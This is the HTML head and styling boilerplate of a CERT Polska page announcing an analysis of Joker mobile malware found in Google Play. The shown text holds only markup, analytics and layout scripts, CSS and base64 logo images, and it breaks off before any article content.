<!doctype html>
<html class="no-js" lang="en">
<head>
    <meta charset="utf-8"/>
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="initial-scale=1.0"/>
    <title>    The Dark Knight Returns: Joker malware analysis | CERT Polska
</title>
    <link rel="canonical" href="https://cert.pl/en/posts/2024/10/analiza-joker/">

    <link rel="icon" href="/theme/assets/img/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/theme/assets/css/fonts.css">

        <link rel="stylesheet" href="/theme/assets/css/style.min.css?c6a76667">

    <link rel="stylesheet" href="/theme/assets/css/pygment.css">
    <link rel="stylesheet" href="/theme/assets/css/legacy.css">
    <meta property="og:description" content="CERT Polska has recently observed new samples of the âJokerâ mobile malware. The applications are present in the Google Play Store and target Polish users, among others.">
    <meta property="og:type" content="article" />
    <meta property="og:title" content="The Dark Knight Returns: Joker malware analysis" />
    <meta property="og:image" content="https://cert.pl/uploads/2024/09/miniatura.png" />

    <link rel="alternate" type="application/atom+xml" title="CERT Polska - Atom" href="/en/atom.xml">
    <link rel="alternate" type="application/rss+xml" title="CERT Polska - RSS" href="/en/rss.xml">

<script data-cfasync="false" nonce="3f35f6e3-92fb-4f1d-acc2-61c50d1b8454">try{(function(w,d){!function(cJ,cK,cL,cM){if(cJ.zaraz)console.error("zaraz is loaded twice");else{cJ[cL]=cJ[cL]||{};cJ[cL].executed=[];cJ.zaraz={deferred:[],listeners:[]};cJ.zaraz._v="5815";cJ.zaraz._n="3f35f6e3-92fb-4f1d-acc2-61c50d1b8454";cJ.zaraz.q=[];cJ.zaraz._f=function(cN){return async function(){var cO=Array.prototype.slice.call(arguments);cJ.zaraz.q.push({m:cN,a:cO})}};for(const cP of["track","set","debug"])cJ.zaraz[cP]=cJ.zaraz._f(cP);cJ.zaraz.init=()=>{var cQ=cK.getElementsByTagName(cM)[0],cR=cK.createElement(cM),cS=cK.getElementsByTagName("title")[0];cS&&(cJ[cL].t=cK.getElementsByTagName("title")[0].text);cJ[cL].x=Math.random();cJ[cL].w=cJ.screen.width;cJ[cL].h=cJ.screen.height;cJ[cL].j=cJ.innerHeight;cJ[cL].e=cJ.innerWidth;cJ[cL].l=cJ.location.href;cJ[cL].r=cK.referrer;cJ[cL].k=cJ.screen.colorDepth;cJ[cL].n=cK.characterSet;cJ[cL].o=(new Date).getTimezoneOffset();if(cJ.dataLayer)for(const cT of Object.entries(Object.entries(dataLayer).reduce(((cU,cV)=>({...cU[1],...cV[1]})),{})))zaraz.set(cT[0],cT[1],{scope:"page"});cJ[cL].q=[];for(;cJ.zaraz.q.length;){const cW=cJ.zaraz.q.shift();cJ[cL].q.push(cW)}cR.defer=!0;for(const cX of[localStorage,sessionStorage])Object.keys(cX||{}).filter((cZ=>cZ.startsWith("_zaraz_"))).forEach((cY=>{try{cJ[cL]["z_"+cY.slice(7)]=JSON.parse(cX.getItem(cY))}catch{cJ[cL]["z_"+cY.slice(7)]=cX.getItem(cY)}}));cR.referrerPolicy="origin";cR.src="/cdn-cgi/zaraz/s.js?z="+btoa(encodeURIComponent(JSON.stringify(cJ[cL])));cQ.parentNode.insertBefore(cR,cQ)};["complete","interactive"].includes(cK.readyState)?zaraz.init():cJ.addEventListener("DOMContentLoaded",zaraz.init)}}(w,d,"zarazData","script");window.zaraz._p=async bb=>new Promise((bc=>{if(bb){bb.e&&bb.e.forEach((bd=>{try{const be=d.querySelector("script[nonce]"),bf=be?.nonce||be?.getAttribute("nonce"),bg=d.createElement("script");bf&&(bg.nonce=bf);bg.innerHTML=bd;bg.onload=()=>{d.head.removeChild(bg)};d.head.appendChild(bg)}catch(bh){console.error(`Error executing script: ${bd}\n`,bh)}}));Promise.allSettled((bb.f||[]).map((bi=>fetch(bi[0],bi[1]))))}bc()}));zaraz._p({"e":["(function(w,d){})(window,document)"]});})(window,document)}catch(e){throw fetch("/cdn-cgi/zaraz/t"),e;};</script></head>
<body>

<script src="/theme/assets/js/jquery.js"></script>
<script src="/theme/assets/js/foundation.min.js"></script>

<script>
    $body = $('body');

    function changed_mobile(media) {
        if (media.matches) {
            window.mobile = true;
            window.desktop = false;
            $body.removeClass('desktop');
            $body.addClass('mobile');
        } else {
            window.mobile = false;
            window.desktop = true;
            $body.removeClass('mobile');
            $body.addClass('desktop');
        }
    }

    let media = window.matchMedia('(max-width: 800px)');
    media.addEventListener('change', changed_mobile);
    changed_mobile(media);
</script>

<style>
    @media (max-width: 800px) {
        .mobile-header { display: inherit; }
        .desktop-header { display: none; }
        
        .mobile-slider { display: inherit; }
        .desktop-slider { display: none; }
        .hide-mobile { display: none; }
        
        body {
            padding-top: 117px;
        }
    }

    @media (min-width: 800px) {
        .mobile-header { display: none; }
        .desktop-header { display: inherit; }
        
        .mobile-slider { display: none; }
        .desktop-slider { display: inherit; }
        .hide-desktop { display: none; }
    }

    .cta {
        border-radius: 8px;
        min-height: 44px;
        display: inline-block;
        padding: 10px 25px;
        transition: background-color ease-out 0.2s;
    }

    .cta > span {
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100%;
        width: 100%;
    }

    .cta.primary {
        color: #FCFDFD !important;
        background-color: #155C25;
    }

    .cta.primary:hover {
        color: #FCFDFD !important;
        background-color: #1B7730;
    }

    .card.important {
        background-color: #121f28;
        color: #FCFDFD;
    }

    .card.important a {
        color: #ccfdcd !important;
    }
</style>

<style>
    .mobile-header {
        top: 0;
        width: 100%;
        color: #FCFDFD;
        background-color: #212E3B;
        position: fixed;
        font-size: 130%;
        transition: background-color ease-out 0.2s;
        z-index: 10000;
    }
    
    .mobile-header .top {
        display: flex;
        flex-wrap: wrap;
        justify-content: space-around;
    }

    .mobile-header .logo {
        background-image: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTczIiBoZWlnaHQ9IjYwIiB2aWV3Qm94PSIwIDAgMTczIDYwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNMTA5LjMyOCAzOS40NTczSDExMy42MTdMMTE3LjQxIDQ0LjU4MDNMMTE3LjQ2MiA0NC41NTQ5VjM5LjQ1NzNIMTIwLjAzM1Y0Ni4zMTU0SDExNS45MjVMMTEyLjA4IDQxLjA3ODRIMTEyLjA0MVY0Ni4zMTU0SDEwOS4zMjJWMzkuNDU3M0gxMDkuMzI4Wk0xMjQuNDE4IDM5LjQ1NzNIMTI4LjA3TDEzMi4zNDYgNDYuMzE1NEgxMjguOTY0TDEyOC4yNDQgNDUuMDA0NkgxMjMuODc4TDEyMy4xNTggNDYuMzE1NEgxMjAuMTNMMTI0LjQxOCAzOS40NTczWk0xMjcuNTI0IDQzLjY2ODRMMTI2LjEyOSA0MC44MTg4SDEyNi4wODRMMTI0LjY1IDQzLjY2ODRIMTI3LjUzSDEyNy41MjRaTTEzMS4zOTQgNDQuMTgxM0gxMzQuNDIzQzEzNC40MjMgNDQuNDM0NiAxMzQuNTE5IDQ0LjYzNzMgMTM0Ljc4OSA0NC44Mzk5QzEzNS4wMDggNDUuMDEwOSAxMzUuNDEzIDQ1LjEyNDkgMTM2LjAwNCA0NS4xNTAyQzEzNi41NTEgNDUuMTUwMiAxMzYuOTU2IDQ1LjA5MzIgMTM3LjI2NSA0NC45NTM5QzEzNy41OCA0NC44Mzk5IDEzNy43NjYgNDQuNjY4OSAxMzcuNzY2IDQ0LjQ3MjZDMTM3Ljc2NiA0NC4zMjcgMTM3LjY4MyA0NC4xODc3IDEzNy41NDggNDQuMTA1M0MxMzcuNDEyIDQzLjk5MTQgMTM3LjIzMiA0My45MDkgMTM3LjAwNyA0My44NTJDMTM2LjgxNSA0My43OTUxIDEzNi41NTcgNDMuNzM4MSAxMzYuMzI2IDQzLjcwNjRDMTM2LjA1NiA0My42NDk0IDEzNS44MjQgNDMuNjI0MSAxMzUuNjA2IDQzLjU5MjRDMTM0Ljc1MSA0My40NTMxIDEzNC4wMjQgNDMuMzMyOCAxMzMuNDg0IDQzLjE5MzVDMTMyLjk4MyA0My4wNzk1IDEzMi41MzIgNDIuODgzMiAxMzIuMTM0IDQyLjYyMzVDMTMxLjc2NyA0Mi4zMzg2IDEzMS41ODcgNDEuOTk2NiAxMzEuNTg3IDQxLjU0MDdDMTMxLjU4NyA0MS4wMjc4IDEzMS43NjcgNDAuNjI4OCAxMzIuMTcyIDQwLjMxODVDMTMyLjU3NyA0MC4wMDE5IDEzMy4xMjQgMzkuNzQ4NiAxMzMuODM4IDM5LjYwM0MxMzQuNTE5IDM5LjQ2MzcgMTM1LjMyOSAzOS4zNzUgMTM2LjIzNiAzOS4zNzVDMTM3LjY4MyAzOS4zNzUgMTM4LjgwOCAzOS41NzEzIDEzOS40ODMgMzkuOTEzM0MxNDAuMjA5IDQwLjI1NTIgMTQwLjU2MyA0MC43NDI4IDE0MC41NjMgNDEuMzM4MVY0MS41NDA3SDEzNy41NDhDMTM3LjU0OCA0MS4yODExIDEzNy40NTEgNDEuMDg0OCAxMzcuMTgxIDQwLjk0NTVDMTM2LjkxMSA0MC43NzQ1IDEzNi41NTcgNDAuNzE3NSAxMzYuMTAxIDQwLjcxNzVDMTM1LjY5NiA0MC43MTc1IDEzNS4zODEgNDAuNzc0NSAxMzUuMTQ5IDQwLjkyMDFDMTM0Ljg3OSA0MS4wMzQxIDEzNC43NDQgNDEuMjA1MSAxMzQuNzQ0IDQxLjM3NjFDMTM0Ljc0NCA0MS43MTggMTM1LjMyOSA0MS45NzEzIDEzNi41NTcgNDIuMTQyM0MxMzcuMzY3IDQyLjI1NjMgMTM3Ljk1MyA0Mi4zMzg2IDEzOC4zNTggNDIuNDAxOUMxMzguNzYzIDQyLjQ4NDIgMTM5LjE2OCA0Mi41NzI5IDEzOS41NzMgNDIuNzEyMkMxMzkuOTkxIDQyLjg1MTUgMTQwLjMwNiA0My4wNTQyIDE0MC41NjMgNDMuMzA3NUMxNDAuNzk0IDQzLjUzNTQgMTQwLjkyOSA0My44Nzc0IDE0MC45NzQgNDQuMjQ0N0MxNDAuOTc0IDQ0Ljc1NzYgMTQwLjc0OSA0NS4xNTY1IDE0MC4zMzggNDUuNDk4NUMxMzkuODg4IDQ1Ljg0MDQgMTM5LjMwOSA0Ni4wNjg0IDEzOC41NzYgNDYuMjM5NEMxMzcuODYzIDQ2LjM3ODcgMTM3LjA0NiA0Ni40NTQ3IDEzNi4xODQgNDYuNDU0N0MxMzUuMTA0IDQ2LjQ1NDcgMTM0LjE5OCA0Ni4zNzg3IDEzMy41MjMgNDYuMjM5NEMxMzIuODQxIDQ2LjA2ODQgMTMyLjMwMSA0NS44MTUxIDEzMS45NDEgNDUuNDczMkMxMzEuNTc0IDQ1LjEzMTIgMTMxLjM5NCA0NC43MDY5IDEzMS4zOTQgNDQuMTk0TTE0MS4zMDIgMzkuNDdIMTQ0LjMxOFY0Mi40ODQySDE0NC4zNjlMMTQ3Ljc5NiAzOS40N0gxNTEuMjc1TDE0Ny41NzggNDIuNDg0MkwxNTEuNTk2IDQ2LjMyOEgxNDcuODg2TDE0NC4zNjkgNDIuNjgwNUgxNDQuMzE4VjQ2LjMyOEgxNDEuMzAyVjM5LjQ3WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTEyOC41NTkgMTQuMzgwOEMxMjguNDA1IDE0LjIyODggMTI4LjE0NyAxMy45ODE5IDEyOCAxMy44Mjk5TDEyNy42MiAxMy40NTYzQzEyNy40NjYgMTMuMzA0MyAxMjcuMjE1IDEzLjMwNDMgMTI3LjA2MSAxMy40NTYzTDEyNS43MzYgMTQuNzYwOEMxMjUuNTgyIDE0LjkxMjcgMTI1LjU4MiAxNS4xNjYgMTI1LjczNiAxNS4zMThMMTI2LjExNiAxNS42OTE2QzEyNi4yNyAxNS44NDM2IDEyNi41MjcgMTYuMDk2OSAxMjYuNjgxIDE2LjI0ODlMMTMzLjM4MSAyMi44NDczQzEzMy41MzUgMjIuOTk5MyAxMzMuNTM1IDIzLjI0NjIgMTMzLjM4MSAyMy4zOTgyTDEyNi42ODEgMjkuOTk2NkMxMjYuNTI3IDMwLjE0ODYgMTI2LjI3NiAzMC4zOTU2IDEyNi4xMTYgMzAuNTUzOUwxMjUuNzM2IDMwLjkyNzVDMTI1LjU4MiAzMS4wNzk1IDEyNS41ODIgMzEuMzI2NSAxMjUuNzM2IDMxLjQ3ODRMMTI3LjA2MSAzMi43ODI5QzEyNy4yMTUgMzIuOTM0OSAxMjcuNDY2IDMyLjkzNDkgMTI3LjYyIDMyLjc4MjlMMTI4IDMyLjQwOTNDMTI4LjE1NCAzMi4yNTczIDEyOC40MTEgMzIuMDEwNCAxMjguNTU5IDMxLjg1ODRMMTM2LjIwNCAyNC4zMjkxQzEzNi4zNTggMjQuMTc3MSAxMzYuNDg3IDIzLjg3MzIgMTM2LjQ4NyAyMy42NTc5VjIyLjU4MTNDMTM2LjQ4NyAyMi4zNjYgMTM2LjM1OCAyMi4wNjIxIDEzNi4yMDQgMjEuOTEwMUwxMjguNTU5IDE0LjM4MDhaIiBmaWxsPSIjMjhBNzQ1Ii8+CjxwYXRoIGQ9Ik0xNTEuMTkxIDI5Ljg4MjhIMTM3LjcyN0MxMzcuNTA5IDI5Ljg4MjggMTM3LjMyOSAzMC4wNjAxIDEzNy4zMjkgMzAuMjc1NFYzMi4xMTgyQzEzNy4zMjkgMzIuMzMzNSAxMzcuNTA5IDMyLjUxMDggMTM3LjcyNyAzMi41MTA4SDE1MS4xOTFDMTUxLjQxIDMyLjUxMDggMTUxLjU5IDMyLjMzMzUgMTUxLjU5IDMyLjExODJWMzAuMjc1NEMxNTEuNTkgMzAuMDYwMSAxNTEuNDEgMjkuODgyOCAxNTEuMTkxIDI5Ljg4MjhaIiBmaWxsPSIjMjhBNzQ1Ii8+CjxwYXRoIGQ9Ik0zNS45Mjg0IDEzLjcxNThIMzAuOTc3N0MzMC43NTkxIDEzLjcxNTggMzAuNDExOSAxMy43ODU1IDMwLjIxMjUgMTMuODY3OEwzMC4wMDA0IDEzLjk1MDFDMjkuNzk0NiAxNC4wMzI0IDI5LjUwNTMgMTQuMjIyNCAyOS4zNTEgMTQuMzc0NEwyMS43MDYyIDIxLjkwMzdDMjEuNTUxOSAyMi4wNTU3IDIxLjQyMzMgMjIuMzU5NiAyMS40MjMzIDIyLjU3NDlWMjMuNjUxNEMyMS40MjMzIDIzLjg2NjcgMjEuNTUxOSAyNC4xNzA3IDIxLjcwNjIgMjQuMzIyN0wyOS4zNTEgMzEuODUyQzI5LjUwNTMgMzIuMDAzOSAyOS43OTQ2IDMyLjE5MzkgMzAuMDAwNCAzMi4yNzYyTDMwLjIxMjUgMzIuMzU4NkMzMC40MTE5IDMyLjQ0MDkgMzAuNzU5MSAzMi41MTA1IDMwLjk3NzcgMzIuNTEwNUgzNS45Mjg0QzM2LjE0NyAzMi41MTA1IDM2LjMyNyAzMi4zMzMyIDM2LjMyNyAzMi4xMTc5VjMwLjI3NTJDMzYuMzI3IDMwLjA1OTkgMzYuMTQ3IDI5Ljg4MjYgMzUuOTI4NCAyOS44ODI2SDMxLjUzMDZDMzEuMzEyIDI5Ljg4MjYgMzEuMDAzNCAyOS43NTU5IDMwLjg0OTEgMjkuNjAzOUwyNC41NDE3IDIzLjM5MThDMjQuMzg3NCAyMy4yMzk4IDI0LjM4NzQgMjIuOTkyOSAyNC41NDE3IDIyLjgzNDZMMzAuODQ5MSAxNi42MjI0QzMxLjAwMzQgMTYuNDcwNCAzMS4zMTIgMTYuMzQzOCAzMS41MzA2IDE2LjM0MzhIMzUuOTI4NEMzNi4xNDcgMTYuMzQzOCAzNi4zMjcgMTYuMTY2NSAzNi4zMjcgMTUuOTUxMlYxNC4xMDg0QzM2LjMyNyAxMy44OTMxIDM2LjE0NyAxMy43MTU4IDM1LjkyODQgMTMuNzE1OFoiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik01Mi40MjAyIDEzLjcxNThINDEuNTI4NUM0MS4zMDk5IDEzLjcxNTggNDEuMDAxMyAxMy44NDI1IDQwLjg1MzQgMTMuOTk0NEw0MC4wODgzIDE0Ljc1NDNDMzkuOTM0IDE0LjkwNjMgMzkuODA1NCAxNS4yMTAzIDM5LjgwNTQgMTUuNDI1NlYyMS40MTYxQzM5LjgwNTQgMjEuNjMxNCAzOS44MDU0IDIxLjgwODcgMzkuODA1NCAyMS44MDg3VjI0LjAzNzdDMzkuODA1NCAyNC4yNTMgMzkuODA1NCAyNC40MzAzIDM5LjgwNTQgMjQuNDMwM1YzMC44MTM0QzM5LjgwNTQgMzEuMDI4NyAzOS45MzQgMzEuMzMyNyA0MC4wODE5IDMxLjQ4NDdMNDAuODUzNCAzMi4yNDQ2QzQxLjAwNzcgMzIuMzk2NiA0MS4zMDk5IDMyLjUyMzIgNDEuNTI4NSAzMi41MjMySDUyLjQyMDJDNTIuNjM4OCAzMi41MjMyIDUyLjgxODggMzIuMzQ1OSA1Mi44MTg4IDMyLjEzMDZWMzAuMjg3OUM1Mi44MTg4IDMwLjA3MjUgNTIuNjM4OCAyOS44OTUyIDUyLjQyMDIgMjkuODk1Mkg0Mi44NTk1QzQyLjY0MDkgMjkuODk1MiA0Mi40NjA4IDI5LjcxNzkgNDIuNDYwOCAyOS41MDI2VjI0LjgyOTNDNDIuNDYwOCAyNC42MTQgNDIuNjQwOSAyNC40MzY3IDQyLjg1OTUgMjQuNDM2N0g0OS45MTkxQzUwLjEzNzcgMjQuNDM2NyA1MC4zMTc3IDI0LjI1OTQgNTAuMzE3NyAyNC4wNDQxVjIyLjIwNzZDNTAuMzE3NyAyMS45OTIzIDUwLjEzNzcgMjEuODE1IDQ5LjkxOTEgMjEuODE1SDQyLjg1OTVDNDIuNjQwOSAyMS44MTUgNDIuNDYwOCAyMS42Mzc3IDQyLjQ2MDggMjEuNDIyNFYxNi43NDkxQzQyLjQ2MDggMTYuNTMzOCA0Mi42NDA5IDE2LjM1NjUgNDIuODU5NSAxNi4zNTY1SDUyLjQyMDJDNTIuNjM4OCAxNi4zNTY1IDUyLjgxODggMTYuMTc5MSA1Mi44MTg4IDE1Ljk2MzhWMTQuMTIxMUM1Mi44MTg4IDEzLjkwNTggNTIuNjM4OCAxMy43Mjg1IDUyLjQyMDIgMTMuNzI4NSIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTg1LjcwNTkgMTUuOTUxMlYxNC4xMDg0Qzg1LjcwNTkgMTMuODkzMSA4NS41MjU5IDEzLjcxNTggODUuMzA3MyAxMy43MTU4SDcyLjMzMjVDNzIuMTEzOSAxMy43MTU4IDcxLjkzMzggMTMuODkzMSA3MS45MzM4IDE0LjEwODRWMTUuOTUxMkM3MS45MzM4IDE2LjE2NjUgNzIuMTEzOSAxNi4zNDM4IDcyLjMzMjUgMTYuMzQzOEg3Ny4wOTAzQzc3LjMwODkgMTYuMzQzOCA3Ny40ODkgMTYuNTIxMSA3Ny40ODkgMTYuNzM2NFYzMi4xMTc5Qzc3LjQ4OSAzMi4zMzMyIDc3LjY2OSAzMi41MTA1IDc3Ljg4NzYgMzIuNTEwNUg3OS43NTg2Qzc5Ljk3NzIgMzIuNTEwNSA4MC4xNTcyIDMyLjMzMzIgODAuMTU3MiAzMi4xMTc5VjE2LjczNjRDODAuMTU3MiAxNi41MjExIDgwLjMzNzMgMTYuMzQzOCA4MC41NTU5IDE2LjM0MzhIODUuMzEzN0M4NS41MzIzIDE2LjM0MzggODUuNzEyNCAxNi4xNjY1IDg1LjcxMjQgMTUuOTUxMiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTY0LjIzNzggMjQuNzIxNkM2NC4wOTY0IDI0LjU1NyA2NC4xNTQyIDI0LjQyNCA2NC4zNzkzIDI0LjQyNEg2Ny42NTE5QzY3Ljg3MDUgMjQuNDI0IDY4LjE3OTEgMjQuMjk3NCA2OC4zMjcgMjQuMTQ1NEw2OS4wOTg2IDIzLjM3MjhDNjkuMjUyOSAyMy4yMjA4IDY5LjM3NSAyMi45MTY5IDY5LjM2ODYgMjIuNzAxNlYxNS41Mzk2QzY5LjM2ODYgMTUuMzI0MyA2OS4yNCAxNS4wMjY3IDY5LjA4NTcgMTQuODc0N0w2OC4xNzkxIDEzLjk5NDVDNjguMDI0OCAxMy44NDI1IDY3LjcxNjIgMTMuNzIyMiA2Ny40OTc2IDEzLjcyMjJINTcuNTcwNEM1Ny4zNTE4IDEzLjcyMjIgNTcuMDQzMSAxMy44NDg4IDU2Ljg4ODggMTQuMDAwOEw1Ni4xMTczIDE0Ljc2MDdDNTUuOTYzIDE0LjkxMjcgNTUuODQwOCAxNS4yMTY2IDU1Ljg0MDggMTUuNDMxOVYzMi4xMTc5QzU1Ljg0MDggMzIuMzMzMyA1Ni4wMjA4IDMyLjUxMDYgNTYuMjM5NSAzMi41MTA2SDU4LjEwNEM1OC4zMjI2IDMyLjUxMDYgNTguNTAyNyAzMi4zMzMzIDU4LjUwMjcgMzIuMTE3OVYxNi43MzY0QzU4LjUwMjcgMTYuNTIxMSA1OC42ODI3IDE2LjM0MzggNTguOTAxMyAxNi4zNDM4SDY2LjI1NjdDNjYuNDc1MyAxNi4zNDM4IDY2LjY1NTMgMTYuNTIxMSA2Ni42NjE4IDE2LjczNjRMNjYuNjc0NiAyMS40MDk4QzY2LjY3NDYgMjEuNjI1MSA2Ni41MDEgMjEuODAyNCA2Ni4yODI0IDIxLjgwMjRINjEuODEzOUM2MS41OTUzIDIxLjgwMjQgNjEuMzM4MSAyMS45NjA3IDYxLjI0ODEgMjIuMTU3TDYwLjU3MyAyMy42MTM1QzYwLjQ4MyAyMy44MDk4IDYwLjUyMTUgMjQuMTAxMSA2MC42Njk0IDI0LjI2NTdMNjcuMjY2MSAzMi4yMTI5QzY3LjQwNzYgMzIuMzc3NiA2Ny43MDMzIDMyLjUxMDYgNjcuOTIyIDMyLjUxMDZINzAuNjQxN0M3MC44NjAzIDMyLjUxMDYgNzAuOTI0NiAzMi4zNzc2IDcwLjc3NjcgMzIuMjEyOUw2NC4yMTg1IDI0LjcyMTZINjQuMjM3OFoiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik0xMTkuOTI0IDI5Ljg4MjZIMTEyLjM5NUMxMTIuMTc3IDI5Ljg4MjYgMTExLjk5NyAyOS43MDUzIDExMS45OTcgMjkuNDlWMTQuMTE0OEMxMTEuOTk3IDEzLjg5OTUgMTExLjgxNyAxMy43MjIyIDExMS41OTggMTMuNzIyMkgxMDkuNzMzQzEwOS41MTUgMTMuNzIyMiAxMDkuMzM1IDEzLjg5OTUgMTA5LjMzNSAxNC4xMTQ4VjMwLjgwNzFDMTA5LjMzNSAzMS4wMjI0IDEwOS40NjMgMzEuMzI2NCAxMDkuNjE4IDMxLjQ3ODRMMTEwLjM4OSAzMi4yMzgzQzExMC41NDMgMzIuMzkwMiAxMTAuODQ2IDMyLjUxNjkgMTExLjA2NCAzMi41MTY5SDExOS45MjRDMTIwLjE0MyAzMi41MTY5IDEyMC4zMjMgMzIuMzM5NiAxMjAuMzIzIDMyLjEyNDNWMzAuMjgxNUMxMjAuMzIzIDMwLjA2NjIgMTIwLjE0MyAyOS44ODg5IDExOS45MjQgMjkuODg4OSIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTEwNS4wNTkgMTMuOTk0NEMxMDQuOTA1IDEzLjg0MjUgMTA0LjU5NiAxMy43MTU4IDEwNC4zNzcgMTMuNzE1OEg5NC42NTU5Qzk0LjQzNzMgMTMuNzE1OCA5NC4xMjg3IDEzLjg0MjUgOTMuOTc0NCAxMy45OTQ0TDkzLjIwMjggMTQuNzU0M0M5My4wNDg1IDE0LjkwNjMgOTIuOTE5OSAxNS4yMTAzIDkyLjkxOTkgMTUuNDI1NlYzMi4xMTE2QzkyLjkxOTkgMzIuMzI2OSA5My4wOTk5IDMyLjUwNDIgOTMuMzE4NiAzMi41MDQySDk1LjE4MzFDOTUuNDAxNyAzMi41MDQyIDk1LjU4MTggMzIuMzI2OSA5NS41ODE4IDMyLjExMTZWMTYuNzQyN0M5NS41ODE4IDE2LjUyNzQgOTUuNzYxOCAxNi4zNTAxIDk1Ljk4MDQgMTYuMzUwMUgxMDMuMTExQzEwMy4zMjkgMTYuMzUwMSAxMDMuNTA5IDE2LjUyNzQgMTAzLjUxNiAxNi43NDI3VjIxLjQwOThDMTAzLjUxNiAyMS42MjUxIDEwMy4zNDIgMjEuODAyNCAxMDMuMTI0IDIxLjgwMjRIOTcuNDA3N0M5Ny4xODkxIDIxLjgwMjQgOTcuMDA5MSAyMS45Nzk3IDk3LjAwOTEgMjIuMTk1VjI0LjAzNzdDOTcuMDA5MSAyNC4yNTMgOTcuMTg5MSAyNC40MzAzIDk3LjQwNzcgMjQuNDMwM0gxMDQuNTEyQzEwNC43MzEgMjQuNDMwMyAxMDUuMDMzIDI0LjMwMzcgMTA1LjE4OCAyNC4xNTE3TDEwNS45NTkgMjMuMzc5MUMxMDYuMTEzIDIzLjIyNzIgMTA2LjIzNiAyMi45MjMyIDEwNi4yMjkgMjIuNzA3OVYxNS40MDY2QzEwNi4yMjkgMTUuMTkxMyAxMDYuMDk0IDE0Ljg5MzcgMTA1Ljk0IDE0Ljc0MTdMMTA1LjA0NiAxNC4wMDA4TDEwNS4wNTkgMTMuOTk0NFoiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik04Ny40NTQ5IDI5LjUwMjlIODUuMzY1M0M4NS4xMjA5IDI5LjUwMjkgODQuOTIxNiAyOS42OTkyIDg0LjkyMTYgMjkuOTM5OVYzMi4wNjc2Qzg0LjkyMTYgMzIuMzA4MiA4NS4xMjA5IDMyLjUwNDUgODUuMzY1MyAzMi41MDQ1SDg3LjQ1NDlDODcuNjk5MiAzMi41MDQ1IDg3Ljg5ODUgMzIuMzA4MiA4Ny44OTg1IDMyLjA2NzZWMjkuOTM5OUM4Ny44OTg1IDI5LjY5OTIgODcuNjk5MiAyOS41MDI5IDg3LjQ1NDkgMjkuNTAyOVoiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo=);
        width: 173px;
        height: 47px;
        margin: 10px auto 10px 0;
    }

    .mobile-header .report-incident {
        margin: 10px 10px 10px auto;
    }

    .mobile-header .menu-bar {
        display: flex;
        padding: 0 15px;
    }

    .mobile-header .menu-bar .language {
        height: 50px;
        width: 50px;
        background-repeat: no-repeat;
        background-position: center;
        margin-left: auto;
        display: inline-block;
    }
    
    .mobile-header .menu-bar .language.pl {
        background-image: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjIiIGhlaWdodD0iMjIiIHZpZXdCb3g9IjAgMCAyMiAyMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGcgY2xpcC1wYXRoPSJ1cmwoI2NsaXAwXzcyNF8xMDM2MCkiPgo8cGF0aCBkPSJNMTkuNTU1NiAzLjA1NTY2SDIuNDQ0NDRDMS43OTYxNCAzLjA1NTY2IDEuMTc0MzggMy4zMTMyIDAuNzE1OTYxIDMuNzcxNjNDMC4yNTc1MzkgNC4yMzAwNSAwIDQuODUxOCAwIDUuNTAwMTFMMCAxMS4wMDAxSDIyVjUuNTAwMTFDMjIgNC44NTE4IDIxLjc0MjUgNC4yMzAwNSAyMS4yODQgMy43NzE2M0MyMC44MjU2IDMuMzEzMiAyMC4yMDM5IDMuMDU1NjYgMTkuNTU1NiAzLjA1NTY2WiIgZmlsbD0iI0VFRUVFRSIvPgo8cGF0aCBkPSJNMCAxNi41QzAgMTcuMTQ4MyAwLjI1NzUzOSAxNy43NzAxIDAuNzE1OTYxIDE4LjIyODVDMS4xNzQzOCAxOC42ODY5IDEuNzk2MTQgMTguOTQ0NCAyLjQ0NDQ0IDE4Ljk0NDRIMTkuNTU1NkMyMC4yMDM5IDE4Ljk0NDQgMjAuODI1NiAxOC42ODY5IDIxLjI4NCAxOC4yMjg1QzIxLjc0MjUgMTcuNzcwMSAyMiAxNy4xNDgzIDIyIDE2LjVWMTFIMFYxNi41WiIgZmlsbD0iI0RDMTQzQyIvPgo8L2c+CjxkZWZzPgo8Y2xpcFBhdGggaWQ9ImNsaXAwXzcyNF8xMDM2MCI+CjxyZWN0IHdpZHRoPSIyMiIgaGVpZ2h0PSIyMiIgZmlsbD0id2hpdGUiLz4KPC9jbGlwUGF0aD4KPC9kZWZzPgo8L3N2Zz4K");
    }
    
    .mobile-header .menu-bar .language.en {
        background-image: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjIiIGhlaWdodD0iMjIiIHZpZXdCb3g9IjAgMCAyMiAyMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGcgY2xpcC1wYXRoPSJ1cmwoI2NsaXAwXzc4MV8xMDkzNSkiPgo8cGF0aCBkPSJNMTMuMDYyNSAxOC41NjI1SDE4LjU2MjVDMTkuMjQyMSAxOC41NjI1IDE5LjgxOTYgMTguNDA5MiAyMC4yOTkyIDE4LjE0MjFMMTMuMDYyNSAxMy44MjUzVjE4LjU2MjVaTTIxLjg4MzIgMTUuODg0N0MyMS45NjE1IDE1LjUzNTEgMjIuMDAxNCAxNS4xNjQ5IDIyLjAwMTQgMTQuNzgwOVYxMy4wNjIySDE3LjE1MTFMMjEuODgxOCAxNS44ODQ3TTAuMTIwMzUzIDYuMTA0NjZDMC4wMzg4ODU4IDYuNDcwMzggLTAuMDAxNDY4NjMgNi44NDQwNiA0LjA4MjMyZS0wNSA3LjIxODc1VjguOTM3NUg0Ljg2ODkyTDAuMTIwMzUz